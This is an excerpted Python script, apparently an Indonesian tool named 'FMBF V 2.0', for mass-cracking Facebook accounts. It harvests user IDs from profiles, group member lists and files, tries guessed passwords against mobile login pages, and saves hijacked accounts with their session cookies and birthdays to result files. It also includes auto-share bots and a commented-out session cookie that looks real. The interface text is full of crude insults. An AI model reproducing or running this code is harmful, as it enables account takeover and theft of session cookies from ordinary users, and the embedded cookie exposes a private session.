...
#except:os.system("python -m pip install licensing &> /dev/null")
...
class menu:
	...
	def tampilan_logo(self):
		...
		jalan(f"""{xnxx}                           
         ...
         [ Mobazan Ft Sanofly ] ✓                                                                                                                                      
  \033[44m\033[1;37m Informasi Script  \033[41m\033[1;37m FMBF V 2.0 \x1b[0m\n
 Author   : {P}    Mobazan{Q}
 Coded    : {P}         Mobazan & Sanofly 😮{Q}
 """) 
	...
	def mani(self):
		...
		try:
			...
			jalan(" |-->Token Basi");time.sleep(0.25)
			jalan(" |-->Jalanlan Ulang Script");time.sleep(0.25)
			os.sys.exit()
		self.tampilan_logo()
		jalan(f"""{Q}[{C}•{Q}] {O}Ingfo Akun/Menu{Q}

 Nama Akun      : {O}{nama}{Q} Fuck
 Id Akun        : {M}{idz}{Q}
 Status Login   : {II}{zza}{Q}
 Status ApiKey  : {II}Premium Nepi ka Kiamat{Q}
 Apikey/Lisensi : {II}ZXSJ-****-****-B45J{Q}
 ┌───────────────────────── MenuScript ────────────────────────┐""")
		...
		print(f' │-->7. Crack Dari File		 			{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->8. Crack Dari Komentar				{M}OFF{Q}    |');time.sleep(0.25)
		print(f' │-->9. Crack Dari Member Group				{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->10.Crack Dari Saran Teamn				{M}OFF{Q}    |');time.sleep(0.25)
		print(f' │-->11.Check Jumlah Teman ({O}Rawan Check Point{Q})		{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->12.Lihat Hasil Crack 				{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->13.Check Options Facebook Hasil Crack		{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->14.Bot Auto Share					{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->15.Report Script					{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->16.Ingfo Token Dan Cookies				{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->17.Lihat Aplikasi Terkait Lewat Hasil Crack    	{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->18.Setting User Agent       │');time.sleep(0.25)
		print(f' │-->00.Keluar ({M}Hapus Token{Q})                                   |');time.sleep(0.25)
		print(f' └─────────────────────────────────────────────────────────────┘');time.sleep(0.25)
		pio = input(f"{Q}[{M}?{Q}]-->Pilihan : ")
		if pio in (""," "):
			jalan(" -->Isi Dengan Benar Anjink!!");time.sleep(1)
			menu()
		elif pio in ("01","1"):
			self.public_mass()
			os.sys.exit()
...
###### Crack Dari Public Tapi Old ######
	def public_ambil_old(self):
		...
		jalan(" |-->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		print(" |")
		print(f"[{M}!{Q}]-->{O}Masukan ID Atau Username Target{Q}")
		print(" |")
		idt = input(" |-->Target :")
		try:
			if idt == "me":idt = "me"
...
##### Ambil Id Dari Grup #####
	def menu_grup(self):
		try:
			...
			os.sys.exit()
		print(' |')
		print(f' |-->1. Masuakan Id ({O}Manual{Q})')
		print(f' |-->2. Otomatis ({O}Ambil Dari Grup Sendiri{Q})')
		print(' |')
		qiw = input(" |-->Pilih : ")
		if qiw in (""," "):
			jalan(f' |-->Jangan Kosong Kontol....')
			time.sleep(1)
			self.menu_grup()
		elif qiw in ("1","01"):
			self.manual_()
...
#		jalan(f" |-->{O}Tekan CTRL + C Untuk Stop Mengumpulkan...{Q}");time.sleep(1)
		for idg in id_group:
			try:
				print("\n |")
				url_group = "https://mbasic.facebook.com/browse/group/members/?id="+idg
...
class crackmenu:
	...
	def menu_crack(self):   # METHOD AUTO PASSWROD
		print(' ')
		jalan(war+"Silahkan Pilih Metode Login Ya Anjink!")
		print(' ')
		jalan(" ┌──────────────── Metode ─────────────────┐")
		...
		print(Q+" |-->4. Mbasic V1 ("+II+"Disarankan V1"+Q+")         |");time.sleep(0.02)
	...
	def menu_crack_m(self):   # METHOD MANUAL PASSWORD
		...
		print(' |')
		jalan(" |-->Silahkan Coba Satu Satu, Jangan Lupa Hidup Matikan Mode Pesawat Ntong Poho Nya")
		print(Q+" |-->1. Mobile V1 ");time.sleep(0.02)
		print(' |')
	def pro_ses(self):
		print(' ┌─────────────────────────────────────────────────────────┐')
		jalan(f" |-->Hasil Crack Yang CP DiSimpan : {K}Hasil/CP-{O}{durasi}{K}.txt{Q}|")
		jalan(f" |-->Hasil Crack Yang OK DiSimpan : {II}Hasil/OK-{O}{durasi}{II}.txt{Q}|")
		print(' └─────────────────────────────────────────────────────────┘')
	def passmenu(self,isifile):
		...
		if zk in ('m','M','Manual','manual'):
			while True:
				jalan(war+"Contoh Password : sayang,memek")
				...
				jm = input(" |-->Pilih :")
				if jm == "":
					jalan(war+"Isi Dengan Benar Lah Kentod");time.sleep(1)
		...
		if "" == "":
			for pw in kiky__gtg:
				...
				if 'c_user' in session.cookies.get_dict():
					...
					zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
					cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
#					cek_cookies_by_risky_ua(user, coki, zczc, ua_random);play_mpv(".Wiii.mp3")
					break
				elif 'checkpoint' in session.cookies.get_dict():
					try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
					except (KeyError, IOError):month = '';day   = '';year  = ''
...
#				cek_cookies_by_risky_ua(user, coki, zczc, ua_random);play_mpv(".Wiii.mp3")
				...
				try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
				except (KeyError, IOError):month = '';day   = '';year  = ''
				except:pass
				print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
				break
...
| $$      | $$  | $$| $$  \ $$  | $$  | $$\  $$$
| $$$$$$$$|  $$$$$$/|  $$$$$$/ /$$$$$$| $$ \  $$
|________/ \______/  \______/ |______/|__/  \__/{Q}
  \033[44m\033[1;37m Options  \033[41m\033[1;37m Login \x1b[0m\n""")
	...
	print(" 4. Lihat Hasil Crack (Ambil Cookies)");time.sleep(1)
	print(" ")
	pox = input(war+"Pilih : ")
	print(" ")
	if pox in (""," "):
		jalan(" -->Jangan Kosong KONTOL!!");time.sleep(1);login()
	elif pox in ("1","01"):
		tokenz = input(" Token : ")
		token_me(tokenz)
		os.sys.exit()
...
def token_me(token):
	try:
		...
		jalan(f"[{M}!{Q}] Selamat Datang {O}{nama}{Q}.... Ngentod")
...
#userf = "100033511519744"
#memek = ""
#cokki = "c_user=100033511519744;datr=ePgiYhoSiQ-4yznUuTagHiUs;fr=0Haz9suKwluccKpyv.AWWpLa4JqIuVzFqv1sWGFPz_XoI.BiIvh4.VG.AAA.0.0.BiIvh4.AWUmda9plu8;sb=ePgiYmIZpjmyte2lSz6pjih_;xs=49%3AmBtGsHCGOIbotA%3A2%3A1646459001%3A-1%3A11352"
#print(cokki)
